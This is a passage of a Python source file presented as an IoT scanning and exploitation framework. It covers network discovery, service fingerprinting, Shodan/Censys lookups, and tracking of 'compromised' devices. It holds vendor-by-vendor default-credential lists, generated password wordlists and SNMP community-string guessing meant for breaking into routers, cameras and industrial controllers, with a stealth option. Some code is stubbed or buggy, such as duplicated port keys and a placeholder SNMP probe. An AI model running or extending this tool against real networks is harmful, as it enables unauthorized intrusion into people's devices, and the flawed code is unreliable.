#!/usr/bin/env python3
"""
Advanced IoT Device Scanner & Exploitation Framework
Comprehensive scanning, fingerprinting, and exploitation tool for controlled environments
"""

import socket
import threading
import time
import json
import requests
import paramiko
import telnetlib
import subprocess
import hashlib
import base64
import re
import os
import sqlite3
import nmap
import scapy.all as scapy
from concurrent.futures import ThreadPoolExecutor, as_completed
from ipaddress import IPv4Network, IPv6Network
import logging
from datetime import datetime, timedelta
import random
import string
import urllib.parse
from urllib3.exceptions import InsecureRequestWarning
import warnings
warnings.filterwarnings('ignore', category=InsecureRequestWarning)

# Additional imports for advanced features
import dns.resolver
import ssl
import struct
import binascii
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import xml.etree.ElementTree as ET
import yaml
import csv
from pathlib import Path
import asyncio
import aiohttp
import websockets
from bs4 import BeautifulSoup
import whois
import geoip2.database
import shodan
from censys.search import CensysHosts
import censys

# Suppress SSL warnings
requests.packages.urllib3.disable_warnings()

# Configure advanced logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - [%(filename)s:%(lineno)d] - %(message)s',
    handlers=[
        logging.FileHandler('iot_scanner.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Create specialized loggers
scan_logger = logging.getLogger('scanner')
exploit_logger = logging.getLogger('exploits')
fingerprint_logger = logging.getLogger('fingerprint')

class AdvancedIoTScanner:
    def __init__(self, network_range="192.168.1.0/24", max_threads=200, stealth_mode=False, 
                 api_keys=None, database_path="iot_devices.db"):
        self.network_range = network_range
        self.max_threads = max_threads
        self.stealth_mode = stealth_mode
        self.found_devices = []
        self.compromised_devices = []
        self.vulnerable_devices = []
        self.fingerprinted_devices = {}
        self.lock = threading.Lock()
        self.db_path = database_path
        self.api_keys = api_keys or {}
        self.session = requests.Session()
        self.session.verify = False
        self.nm = nmap.PortScanner()
        
        # Initialize database
        self.init_database()
        
        # Load wordlists and signatures
        self.load_wordlists()
        self.load_device_signatures()
        self.load_vulnerability_db()
        
        # Initialize external APIs
        self.init_external_apis()
        
        # Comprehensive IoT ports and services
        self.iot_ports = {
            # Standard services
            22: 'SSH', 23: 'Telnet', 80: 'HTTP', 443: 'HTTPS',
            21: 'FTP', 25: 'SMTP', 53: 'DNS', 110: 'POP3', 143: 'IMAP',
            993: 'IMAPS', 995: 'POP3S', 587: 'SMTP-Submission',
            
            # IoT specific
            1883: 'MQTT', 8883: 'MQTT-SSL', 5683: 'CoAP', 5684: 'CoAPS',
            161: 'SNMP', 162: 'SNMP-Trap', 554: 'RTSP', 8554: 'RTSP-Alt',
            5000: 'UPnP', 1900: 'SSDP', 9999: 'Custom', 8080: 'HTTP-Alt',
            8443: 'HTTPS-Alt', 8000: 'HTTP-Alt2', 8888: 'HTTP-Alt3',
            
            # Industrial protocols
            502: 'Modbus', 102: 'S7', 44818: 'EtherNet/IP', 47808: 'BACnet',
            20000: 'DNP3', 2404: 'IEC-104', 9600: 'Profinet',
            
            # Security cameras
            37777: 'Dahua', 8000: 'Hikvision', 80: 'Generic-Camera',
            
            # Smart home
            8080: 'Home-Assistant', 8123: 'Home-Assistant-Alt',
            3000: 'Node-RED', 1880: 'Node-RED-Alt',
            
            # Routers and networking
            23: 'Router-Telnet', 80: 'Router-Web', 443: 'Router-HTTPS',
            8080: 'Router-Alt', 8443: 'Router-Secure',
            
            # Database services
            3306: 'MySQL', 5432: 'PostgreSQL', 1433: 'MSSQL',
            6379: 'Redis', 27017: 'MongoDB', 5984: 'CouchDB',
            
            # Message queues
            5672: 'RabbitMQ', 61616: 'ActiveMQ', 9092: 'Kafka',
            
            # Monitoring
            3000: 'Grafana', 9090: 'Prometheus', 5601: 'Kibana',
            
            # Development
            3000: 'React', 4200: 'Angular', 8080: 'Tomcat', 8000: 'Django'
        }
        
        # Advanced credential databases
        self.credential_db = {
            'default_creds': [
                # Generic defaults
                ('admin', 'admin'), ('admin', 'password'), ('admin', '12345'),
                ('admin', ''), ('root', 'root'), ('root', 'password'),
                ('root', '12345'), ('root', ''), ('admin', '1234'),
                ('user', 'user'), ('guest', 'guest'), ('admin', '123456'),
                ('admin', 'admin123'), ('admin', 'pass'), ('admin', '123456789'),
                ('admin', 'qwerty'), ('admin', 'letmein'), ('admin', 'welcome'),
                
                # IoT specific
                ('pi', 'raspberry'), ('ubnt', 'ubnt'), ('admin', '1234'),
                ('admin', 'admin'), ('root', 'root'), ('admin', 'password'),
                
                # Router defaults
                ('admin', 'admin'), ('admin', 'password'), ('admin', '1234'),
                ('root', 'root'), ('admin', 'admin'), ('admin', 'password'),
                
                # Camera defaults
                ('admin', 'admin'), ('admin', '12345'), ('admin', '123456'),
                ('admin', 'password'), ('admin', 'admin123'), ('admin', '1234'),
                
                # Industrial defaults
                ('admin', 'admin'), ('admin', 'password'), ('admin', '1234'),
                ('root', 'root'), ('admin', 'admin'), ('admin', 'password')
            ],
            'vendor_specific': {
                'cisco': [('admin', 'admin'), ('cisco', 'cisco')],
                'netgear': [('admin', 'password'), ('admin', '1234')],
                'linksys': [('admin', 'admin'), ('admin', 'password')],
                'dlink': [('admin', ''), ('admin', 'admin')],
                'tp-link': [('admin', 'admin'), ('admin', 'password')],
                'asus': [('admin', 'admin'), ('admin', 'password')],
                'huawei': [('admin', 'admin'), ('admin', 'password')],
                'hikvision': [('admin', '12345'), ('admin', 'admin')],
                'dahua': [('admin', 'admin'), ('admin', '123456')],
                'axis': [('root', 'pass'), ('admin', 'admin')],
                'ubiquiti': [('ubnt', 'ubnt'), ('admin', 'admin')],
                'mikrotik': [('admin', ''), ('admin', 'admin')],
                'fortinet': [('admin', ''), ('admin', 'admin')],
                'sonicwall': [('admin', 'password'), ('admin', 'admin')],
                'watchguard': [('admin', 'readwrite'), ('admin', 'admin')]
            }
        }
        
        # Load external wordlists
        self.wordlists = {
            'usernames': [],
            'passwords': [],
            'common_passwords': []
        }
        
        # Vulnerability database
        self.vuln_db = {}
        
        # Device signatures for fingerprinting
        self.device_signatures = {}
        
        # Exploit modules
        self.exploit_modules = {}
        
        # Statistics
        self.stats = {
            'scanned_hosts': 0,
            'open_ports': 0,
            'successful_logins': 0,
            'vulnerabilities_found': 0,
            'exploits_attempted': 0,
            'exploits_successful': 0
        }

    def init_database(self):
        """Initialize SQLite database for storing results"""
        self.conn = sqlite3.connect(self.db_path)
        cursor = self.conn.cursor()
        
        # Create tables
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS devices (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip TEXT UNIQUE,
                hostname TEXT,
                mac_address TEXT,
                vendor TEXT,
                device_type TEXT,
                os_info TEXT,
                open_ports TEXT,
                services TEXT,
                vulnerabilities TEXT,
                credentials TEXT,
                first_seen TIMESTAMP,
                last_seen TIMESTAMP,
                status TEXT
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS scan_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                scan_id TEXT,
                timestamp TIMESTAMP,
                network_range TEXT,
                total_hosts INTEGER,
                compromised_hosts INTEGER,
                vulnerabilities_found INTEGER,
                scan_duration REAL
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS exploits (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_ip TEXT,
                exploit_name TEXT,
                success BOOLEAN,
                output TEXT,
                timestamp TIMESTAMP
            )
        ''')
        
        self.conn.commit()

    def load_wordlists(self):
        """Load password and username wordlists"""
        wordlist_paths = {
            'usernames': 'wordlists/usernames.txt',
            'passwords': 'wordlists/passwords.txt',
            'common_passwords': 'wordlists/common_passwords.txt'
        }
        
        for wordlist_type, path in wordlist_paths.items():
            if os.path.exists(path):
                with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                    self.wordlists[wordlist_type] = [line.strip() for line in f if line.strip()]
            else:
                # Create default wordlists if they don't exist
                self.create_default_wordlists()

    def create_default_wordlists(self):
        """Create default wordlists if they don't exist"""
        os.makedirs('wordlists', exist_ok=True)
        
        # Default usernames
        usernames = [
            'admin', 'root', 'user', 'guest', 'pi', 'ubuntu', 'centos', 'debian',
            'cisco', 'netgear', 'linksys', 'dlink', 'tp-link', 'asus', 'huawei',
            'hikvision', 'dahua', 'axis', 'ubnt', 'mikrotik', 'fortinet',
            'sonicwall', 'watchguard', 'admin', 'administrator', 'operator',
            'service', 'support', 'test', 'demo', 'default', 'system'
        ]
        
        # Default passwords
        passwords = [
            'admin', 'password', '12345', '123456', '123456789', 'password123',
            'admin123', 'root', 'toor', 'pass', 'letmein', 'welcome', 'qwerty',
            '1234', '12345678', 'password1', 'abc123', 'master', 'login',
            'princess', 'rockyou', '1234567890', 'welcome123', 'monkey',
            'dragon', '111111', 'baseball', 'iloveyou', 'trustno1', '123123',
            'sunshine', 'superman', 'qazwsx', 'michael', 'football', 'shadow',
            'jordan', 'harley', 'ranger', 'hunter', 'buster', 'soccer',
            'hockey', 'killer', 'george', 'sexy', 'andrew', 'charlie',
            'superman', 'asshole', 'fuckyou', 'dallas', 'jessica', 'panties',
            'pepper', '1234', 'zxcvbn', '555555', 'tigger', 'purple',
            'andrea', 'sparky', '123456789', 'dakota', 'aaaaaa', 'password1',
            'lovely', 'fuckme', 'jordan23', 'hottie', 'ranger', 'banana',
            'chelsea', 'summer', 'lovely', 'biteme', 'orange', 'elephant',
            'monkey', 'liverpool', 'letmein', '1111', 'dragon', 'master',
            'sunshine', 'ashley', 'football', 'iloveyou', '2000', 'michelle',
            'snoopy', 'fuckme', 'hannah', 'jordan', 'hunter', 'fuck',
            'michelle', 'charlie', 'soccer', 'tigger', 'sunshine', 'iloveyou',
            '2000', 'charlie', 'robert', 'thomas', 'hockey', 'ranger',
            'daniel', 'hannah', 'michael', 'jessica', 'killer', 'snoopy',
            'master', 'jennifer', 'joshua', 'monkey', 'michelle', 'myxno6',
            'sunshine', 'killer', 'shannon', 'michelle', 'letmein', 'dakota',
            'fuckme', 'trustno1', 'monkey', 'jordan', 'jennifer', 'zxcvbn',
            'bitch', 'andrea', 'fuckyou', 'monkey', 'iloveyou', 'dragon',
            'sunshine', 'snoopy', 'monkey', 'liverpool', 'jordan', 'purple',
            'andrea', 'hannah', 'michelle', 'jordan', 'andrew', 'love',
            '2000', 'charlie', 'robert', 'thomas', 'hockey', 'ranger',
            'daniel', 'hannah', 'michael', 'jessica', 'killer', 'snoopy',
            'master', 'jennifer', 'joshua', 'monkey', 'michelle', 'myxno6'
        ]
        
        with open('wordlists/usernames.txt', 'w') as f:
            f.write('\n'.join(usernames))
        
        with open('wordlists/passwords.txt', 'w') as f:
            f.write('\n'.join(passwords))
        
        with open('wordlists/common_passwords.txt', 'w') as f:
            f.write('\n'.join(passwords[:50]))  # Top 50 most common

    def load_device_signatures(self):
        """Load device fingerprinting signatures"""
        self.device_signatures = {
            'routers': {
                'cisco': ['Cisco', 'IOS', 'Catalyst'],
                'netgear': ['Netgear', 'ReadyNAS'],
                'linksys': ['Linksys', 'WRT'],
                'dlink': ['D-Link', 'DIR-'],
                'tp-link': ['TP-Link', 'TL-'],
                'asus': ['ASUS', 'RT-'],
                'huawei': ['Huawei', 'HG'],
                'ubiquiti': ['Ubiquiti', 'UniFi'],
                'mikrotik': ['MikroTik', 'RouterOS'],
                'fortinet': ['Fortinet', 'FortiGate'],
                'sonicwall': ['SonicWall', 'NSA'],
                'watchguard': ['WatchGuard', 'Firebox']
            },
            'cameras': {
                'hikvision': ['Hikvision', 'DS-'],
                'dahua': ['Dahua', 'DH-'],
                'axis': ['Axis', 'M30'],
                'foscam': ['Foscam', 'FI'],
                'dlink_camera': ['D-Link', 'DCS-'],
                'netgear_camera': ['Netgear', 'Arlo']
            },
            'iot_devices': {
                'raspberry_pi': ['Raspberry Pi', 'Raspbian'],
                'arduino': ['Arduino', 'ATmega'],
                'esp32': ['ESP32', 'ESP-IDF'],
                'esp8266': ['ESP8266', 'NodeMCU'],
                'home_assistant': ['Home Assistant', 'Hass.io'],
                'openhab': ['openHAB', 'Karaf'],
                'domoticz': ['Domoticz', 'WebServer']
            }
        }

    def load_vulnerability_db(self):
        """Load vulnerability database"""
        self.vuln_db = {
            'cve_2021_44228': {
                'name': 'Log4Shell',
                'description': 'Apache Log4j2 Remote Code Execution',
                'severity': 'Critical',
                'ports': [80, 443, 8080, 8443],
                'detection': ['log4j', 'apache', 'tomcat']
            },
            'cve_2021_20016': {
                'name': 'SonicWall SMA100 RCE',
                'description': 'SonicWall SMA100 Remote Code Execution',
                'severity': 'Critical',
                'ports': [443],
                'detection': ['sonicwall', 'sma']
            },
            'cve_2020_1472': {
                'name': 'Zerologon',
                'description': 'Netlogon Elevation of Privilege',
                'severity': 'Critical',
                'ports': [445, 88],
                'detection': ['windows', 'domain']
            },
            'cve_2019_0708': {
                'name': 'BlueKeep',
                'description': 'Windows RDP Remote Code Execution',
                'severity': 'Critical',
                'ports': [3389],
                'detection': ['rdp', 'windows']
            },
            'cve_2017_0144': {
                'name': 'EternalBlue',
                'description': 'SMB Remote Code Execution',
                'severity': 'Critical',
                'ports': [445],
                'detection': ['smb', 'windows']
            }
        }

    def init_external_apis(self):
        """Initialize external API clients"""
        if 'shodan' in self.api_keys:
            try:
                self.shodan_client = shodan.Shodan(self.api_keys['shodan'])
            except:
                self.shodan_client = None
        
        if 'censys' in self.api_keys:
            try:
                self.censys_client = CensysHosts(api_id=self.api_keys['censys']['id'], 
                                                api_secret=self.api_keys['censys']['secret'])
            except:
                self.censys_client = None

    def scan_network(self):
        """Advanced network discovery using multiple techniques"""
        logger.info(f"Starting advanced network scan: {self.network_range}")
        
        # Method 1: ARP scanning for local networks
        if self.is_local_network():
            self.arp_scan()
        
        # Method 2: ICMP ping sweep
        self.icmp_scan()
        
        # Method 3: TCP SYN scan
        self.tcp_syn_scan()
        
        # Method 4: UDP scan for IoT services
        self.udp_scan()
        
        # Method 5: Service discovery
        self.service_discovery_scan()
        
        # Method 6: External intelligence (Shodan/Censys)
        if self.shodan_client or self.censys_client:
            self.external_intelligence_scan()
        
        logger.info(f"Network scan completed. Found {len(self.found_devices)} devices")

    def is_local_network(self):
        """Check if the network range is local/private"""
        try:
            network = IPv4Network(self.network_range)
            return network.is_private
        except:
            return False

    def arp_scan(self):
        """ARP scan for local network discovery"""
        logger.info("Performing ARP scan...")
        try:
            network = IPv4Network(self.network_range)
            arp_request = scapy.ARP(pdst=str(network))
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
            
            for element in answered_list:
                ip = element[1].psrc
                mac = element[1].hwsrc
                if ip not in self.found_devices:
                    self.found_devices.append(ip)
                    self.get_mac_vendor(mac)
        except Exception as e:
            logger.error(f"ARP scan failed: {e}")

    def icmp_scan(self):
        """ICMP ping sweep"""
        logger.info("Performing ICMP ping sweep...")
        network = IPv4Network(self.network_range)
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = []
            for ip in network.hosts():
                future = executor.submit(self.ping_host_icmp, str(ip))
                futures.append(future)
            
            for future in as_completed(futures):
                try:
                    result = future.result()
                    if result and result not in self.found_devices:
                        self.found_devices.append(result)
                except Exception as e:
                    logger.error(f"ICMP scan error: {e}")

    def tcp_syn_scan(self):
        """TCP SYN scan for common ports"""
        logger.info("Performing TCP SYN scan...")
        common_ports = [22, 23, 80, 443, 8080, 8443, 21, 25, 53, 110, 143, 993, 995]
        network = IPv4Network(self.network_range)
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = []
            for ip in network.hosts():
                for port in common_ports:
                    future = executor.submit(self.tcp_port_scan, str(ip), port)
                    futures.append(future)
            
            for future in as_completed(futures):
                try:
                    result = future.result()
                    if result and result not in self.found_devices:
                        self.found_devices.append(result)
                except Exception as e:
                    logger.error(f"TCP scan error: {e}")

    def udp_scan(self):
        """UDP scan for IoT services"""
        logger.info("Performing UDP scan...")
        udp_ports = [161, 162, 53, 123, 1900, 5353, 5683, 1883]
        network = IPv4Network(self.network_range)
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = []
            for ip in network.hosts():
                for port in udp_ports:
                    future = executor.submit(self.udp_port_scan, str(ip), port)
                    futures.append(future)
            
            for future in as_completed(futures):
                try:
                    result = future.result()
                    if result and result not in self.found_devices:
                        self.found_devices.append(result)
                except Exception as e:
                    logger.error(f"UDP scan error: {e}")

    def service_discovery_scan(self):
        """Service discovery using mDNS, SSDP, etc."""
        logger.info("Performing service discovery...")
        try:
            # mDNS discovery
            self.mdns_discovery()
            
            # SSDP discovery
            self.ssdp_discovery()
            
            # DHCP discovery
            self.dhcp_discovery()
            
        except Exception as e:
            logger.error(f"Service discovery error: {e}")

    def external_intelligence_scan(self):
        """Use external APIs for intelligence gathering"""
        logger.info("Gathering external intelligence...")
        try:
            if self.shodan_client:
                self.shodan_scan()
            if self.censys_client:
                self.censys_scan()
        except Exception as e:
            logger.error(f"External intelligence error: {e}")

    def ping_host_icmp(self, ip):
        """Enhanced ICMP ping with multiple techniques"""
        try:
            # Method 1: Socket ping
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.settimeout(1)
            sock.connect((ip, 1))
            sock.close()
            return ip
        except:
            try:
                # Method 2: TCP connect to common port
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((ip, 80))
                sock.close()
                if result == 0:
                    return ip
            except:
                pass
        return None

    def tcp_port_scan(self, ip, port):
        """TCP port scan"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((ip, port))
            sock.close()
            if result == 0:
                return ip
        except:
            pass
        return None

    def udp_port_scan(self, ip, port):
        """UDP port scan"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(1)
            sock.sendto(b'\x00', (ip, port))
            sock.recvfrom(1024)
            sock.close()
            return ip
        except:
            pass
        return None

    def mdns_discovery(self):
        """mDNS service discovery"""
        try:
            import socket
            mdns_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            mdns_socket.settimeout(2)
            mdns_socket.bind(('', 5353))
            
            # Send mDNS query
            query = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x05_local\x04_http\x04_tcp\x05local\x00\x00\x0c\x00\x01'
            mdns_socket.sendto(query, ('224.0.0.251', 5353))
            
            try:
                data, addr = mdns_socket.recvfrom(1024)
                if addr[0] not in self.found_devices:
                    self.found_devices.append(addr[0])
            except socket.timeout:
                pass
            
            mdns_socket.close()
        except Exception as e:
            logger.error(f"mDNS discovery error: {e}")

    def ssdp_discovery(self):
        """SSDP service discovery"""
        try:
            ssdp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            ssdp_socket.settimeout(2)
            
            # Send SSDP M-SEARCH
            ssdp_msg = (
                "M-SEARCH * HTTP/1.1\r\n"
                "HOST: 239.255.255.250:1900\r\n"
                "MAN: \"ssdp:discover\"\r\n"
                "ST: upnp:rootdevice\r\n"
                "MX: 3\r\n\r\n"
            )
            
            ssdp_socket.sendto(ssdp_msg.encode(), ('239.255.255.250', 1900))
            
            try:
                data, addr = ssdp_socket.recvfrom(1024)
                if addr[0] not in self.found_devices:
                    self.found_devices.append(addr[0])
            except socket.timeout:
                pass
            
            ssdp_socket.close()
        except Exception as e:
            logger.error(f"SSDP discovery error: {e}")

    def dhcp_discovery(self):
        """DHCP discovery"""
        try:
            # Listen for DHCP responses
            dhcp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            dhcp_socket.settimeout(2)
            dhcp_socket.bind(('', 68))
            
            try:
                data, addr = dhcp_socket.recvfrom(1024)
                if addr[0] not in self.found_devices:
                    self.found_devices.append(addr[0])
            except socket.timeout:
                pass
            
            dhcp_socket.close()
        except Exception as e:
            logger.error(f"DHCP discovery error: {e}")

    def shodan_scan(self):
        """Shodan intelligence gathering"""
        try:
            network = IPv4Network(self.network_range)
            for ip in network.hosts():
                try:
                    host = self.shodan_client.host(str(ip))
                    if str(ip) not in self.found_devices:
                        self.found_devices.append(str(ip))
                except:
                    pass
        except Exception as e:
            logger.error(f"Shodan scan error: {e}")

    def censys_scan(self):
        """Censys intelligence gathering"""
        try:
            network = IPv4Network(self.network_range)
            for ip in network.hosts():
                try:
                    host = self.censys_client.view(str(ip))
                    if str(ip) not in self.found_devices:
                        self.found_devices.append(str(ip))
                except:
                    pass
        except Exception as e:
            logger.error(f"Censys scan error: {e}")

    def get_mac_vendor(self, mac):
        """Get vendor information from MAC address"""
        try:
            # Simple OUI lookup (first 3 bytes)
            oui = mac[:8].replace(':', '').upper()
            # This would typically use a MAC vendor database
            return "Unknown"
        except:
            return "Unknown"

    def advanced_device_fingerprint(self, ip):
        """Advanced device fingerprinting using multiple techniques"""
        device_info = {
            'ip': ip,
            'hostname': None,
            'mac_address': None,
            'vendor': None,
            'device_type': 'Unknown',
            'os_info': None,
            'services': {},
            'vulnerabilities': [],
            'banner': None,
            'http_headers': {},
            'ssl_info': {},
            'snmp_info': {},
            'upnp_info': {}
        }
        
        # Hostname resolution
        try:
            device_info['hostname'] = socket.gethostbyaddr(ip)[0]
        except:
            pass
        
        # HTTP fingerprinting
        device_info.update(self.http_fingerprint(ip))
        
        # SSL/TLS fingerprinting
        device_info.update(self.ssl_fingerprint(ip))
        
        # SNMP fingerprinting
        device_info.update(self.snmp_fingerprint(ip))
        
        # UPnP fingerprinting
        device_info.update(self.upnp_fingerprint(ip))
        
        # Banner grabbing
        device_info['banner'] = self.banner_grab(ip)
        
        # OS detection
        device_info['os_info'] = self.os_detection(ip)
        
        # Device type classification
        device_info['device_type'] = self.classify_device(device_info)
        
        return device_info

    def http_fingerprint(self, ip):
        """HTTP service fingerprinting"""
        http_info = {'services': {}, 'http_headers': {}}
        
        for port in [80, 443, 8080, 8443, 8000, 8888]:
            try:
                protocol = 'https' if port in [443, 8443] else 'http'
                url = f"{protocol}://{ip}:{port}"
                
                response = self.session.get(url, timeout=3, verify=False)
                http_info['services'][port] = {
                    'status_code': response.status_code,
                    'server': response.headers.get('Server', 'Unknown'),
                    'title': self.extract_title(response.text),
                    'technologies': self.detect_web_technologies(response)
                }
                http_info['http_headers'] = dict(response.headers)
                
            except:
                pass
        
        return http_info

    def ssl_fingerprint(self, ip):
        """SSL/TLS fingerprinting"""
        ssl_info = {'ssl_info': {}}
        
        for port in [443, 8443, 993, 995]:
            try:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                
                with socket.create_connection((ip, port), timeout=3) as sock:
                    with context.wrap_socket(sock, server_hostname=ip) as ssock:
                        cert = ssock.getpeercert()
                        ssl_info['ssl_info'][port] = {
                            'version': ssock.version(),
                            'cipher': ssock.cipher(),
                            'certificate': {
                                'subject': dict(x[0] for x in cert.get('subject', [])),
                                'issuer': dict(x[0] for x in cert.get('issuer', [])),
                                'serial_number': cert.get('serialNumber'),
                                'not_before': cert.get('notBefore'),
                                'not_after': cert.get('notAfter')
                            }
                        }
            except:
                pass
        
        return ssl_info

    def snmp_fingerprint(self, ip):
        """SNMP fingerprinting"""
        snmp_info = {'snmp_info': {}}
        
        try:
            # Try common SNMP community strings
            communities = ['public', 'private', 'admin', 'snmp', 'community']
            
            for community in communities:
                try:
                    # This would use pysnmp library for actual SNMP queries
                    # For now, just check if SNMP is responding
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.settimeout(2)
                    sock.sendto(b'\x30\x0c\x02\x01\x00\x04\x06' + community.encode() + b'\xa0\x05\x02\x03\x00\x00\x00', (ip, 161))
                    data, addr = sock.recvfrom(1024)
                    sock.close()
                    
                    if data:
                        snmp_info['snmp_info'] = {
                            'community': community,
                            'version': 'SNMPv1/v2c',
                            'accessible': True
                        }
                        break
                except:
                    pass
        except:
            pass
        
        return snmp_info

    def upnp_fingerprint(self, ip):
        """UPnP fingerprinting"""
        upnp_info = {'upnp_info': {}}
        
        try:
            # Send UPnP M-SEARCH request
            ssdp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            ssdp_socket.settimeout(3)
            
            ssdp_msg = (
                "M-SEARCH * HTTP/1.1\r\n"
                f"HOST: {ip}:1900\r\n"
                "MAN: \"ssdp:discover\"\r\n"
                "ST: upnp:rootdevice\r\n"
                "MX: 3\r\n\r\n"
            )
            
            ssdp_socket.sendto(ssdp_msg.encode(), (ip, 1900))
            
            try:
                data, addr = ssdp_socket.recvfrom(1024)
                if data:
                    upnp_info['upnp_info'] = {
                        'device_type': self.extract_upnp_device_type(data.decode()),
                        'location': self.extract_upnp_location(data.decode()),
                        'server': self.extract_upnp_server(data.decode())
                    }
            except socket.timeout:
                pass
            
            ssdp_socket.close()
        except:
            pass
        
        return upnp_info

    def banner_grab(self, ip):
        """Banner grabbing from various services"""
        banners = {}
        
        for port, service in self.iot_ports.items():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((ip, port))
                
                # Send service-specific probes
                if service == 'SSH':
                    banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
                elif service == 'HTTP':
                    sock.send(b'GET / HTTP/1.1\r\nHost: ' + ip.encode() + b'\r\n\r\n')
                    banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
                elif service == 'FTP':
                    banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
                else:
                    banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
                
                if banner:
                    banners[port] = banner
                
                sock.close()
            except:
                pass
        
        return banners

    def os_detection(self, ip):
        """OS detection using various techniques"""
        os_info = {'type': 'Unknown', 'version': 'Unknown', 'confidence': 0}
        
        try:
            # TCP fingerprinting
            tcp_fingerprint = self.tcp_fingerprint(ip)
            
            # HTTP fingerprinting
            http_fingerprint = self.http_os_fingerprint(ip)
            
            # SNMP fingerprinting
            snmp_fingerprint = self.snmp_os_fingerprint(ip)
            
            # Combine results
            if tcp_fingerprint['confidence'] > os_info['confidence']:
                os_info = tcp_fingerprint
            if http_fingerprint['confidence'] > os_info['confidence']:
                os_info = http_fingerprint
            if snmp_fingerprint['confidence'] > os_info['confidence']:
                os_info = snmp_fingerprint
                
        except Exception as e:
            logger.error(f"OS detection error: {e}")
        
        return os_info

    def tcp_fingerprint(self, ip):
        """TCP stack fingerprinting"""
        os_info = {'type': 'Unknown', 'version': 'Unknown', 'confidence': 0}
        
        try:
            # Send TCP SYN packets and analyze responses
            # This is a simplified version - real implementation would be more complex
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            
            # Try to connect and analyze TCP options
            try:
                sock.connect((ip, 80))
                # Analyze TCP window size, options, etc.
                os_info = {'type': 'Linux', 'version': 'Unknown', 'confidence': 50}
            except:
                pass
            
            sock.close()
        except:
            pass
        
        return os_info

    def http_os_fingerprint(self, ip):
        """HTTP-based OS fingerprinting"""
        os_info = {'type': 'Unknown', 'version': 'Unknown', 'confidence': 0}
        
        try:
            response = self.session.get(f"http://{ip}", timeout=3, verify=False)
            server_header = response.headers.get('Server', '').lower()
            
            if 'apache' in server_header:
                os_info = {'type': 'Linux', 'version': 'Apache', 'confidence': 70}
            elif 'nginx' in server_header:
                os_info = {'type': 'Linux', 'version': 'Nginx', 'confidence': 70}
            elif 'iis' in server_header:
                os_info = {'type': 'Windows', 'version': 'IIS', 'confidence': 80}
            elif 'lighttpd' in server_header:
                os_info = {'type': 'Linux', 'version': 'Lighttpd', 'confidence': 60}
                
        except:
            pass
        
        return os_info

    def snmp_os_fingerprint(self, ip):
        """SNMP-based OS fingerprinting"""
        os_info = {'type': 'Unknown', 'version': 'Unknown', 'confidence': 0}
        
        try:
            # Query SNMP system description
            # This would use pysnmp for actual queries
            os_info = {'type': 'Network Device', 'version': 'Unknown', 'confidence': 30}
        except:
            pass
        
        return os_info

    def classify_device(self, device_info):
        """Classify device type based on fingerprinting data"""
        device_type = 'Unknown'
        
        # Check banners and services
        banners = device_info.get('banner', {})
        services = device_info.get('services', {})
        
        # Router detection
        if any('cisco' in str(banners).lower() or 'ios' in str(banners).lower() for banners in banners.values()):
            device_type = 'Router'
        elif any('netgear' in str(banners).lower() for banners in banners.values()):
            device_type = 'Router'
        elif any('linksys' in str(banners).lower() for banners in banners.values()):
            device_type = 'Router'
        
        # Camera detection
        elif any('hikvision' in str(banners).lower() for banners in banners.values()):
            device_type = 'Security Camera'
        elif any('dahua' in str(banners).lower() for banners in banners.values()):
            device_type = 'Security Camera'
        elif any('axis' in str(banners).lower() for banners in banners.values()):
            device_type = 'Security Camera'
        
        # IoT device detection
        elif any('raspberry' in str(banners).lower() for banners in banners.values()):
            device_type = 'IoT Device'
        elif any('arduino' in str(banners).lower() for banners in banners.values()):
            device_type = 'IoT Device'
        elif any('esp32' in str(banners).lower() or 'esp8266' in str(banners).lower() for banners in banners.values()):
            device_type = 'IoT Device'
        
        # Check for specific services
        elif 161 in services:  # SNMP
            device_type = 'Network Device'
        elif 1883 in services:  # MQTT
            device_type = 'IoT Device'
        elif 5683 in services:  # CoAP
            device_type = 'IoT Device'
        
        return device_type

    def extract_title(self, html):
        """Extract page title from HTML"""
        try:
            soup = BeautifulSoup(html, 'html.parser')
            title = soup.find('title')
            return title.text.strip() if title else 'No title'
        except:
            return 'No title'

    def detect_web_technologies(self, response):
        """Detect web technologies from HTTP response"""
        technologies = []
        
        # Check headers
        server = response.headers.get('Server', '').lower()
        if 'apache' in server:
            technologies.append('Apache')
        elif 'nginx' in server:
            technologies.append('Nginx')
